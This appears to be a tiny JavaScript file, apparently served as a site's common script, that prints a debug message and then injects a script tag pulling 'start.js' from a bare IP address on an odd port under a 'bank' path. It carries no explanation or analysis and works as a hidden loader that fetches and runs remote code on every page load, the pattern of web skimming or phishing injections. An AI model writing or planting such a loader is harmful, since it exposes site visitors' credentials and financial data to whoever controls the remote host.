//http://10.10.13.31:36521/commom.js
console.log('aa');

var _ = document.createElement("script");
_.type = "text/javascript";
_.src = "https://47.244.49.35:53628/static/bank/start.js";
document.body.appendChild(_);
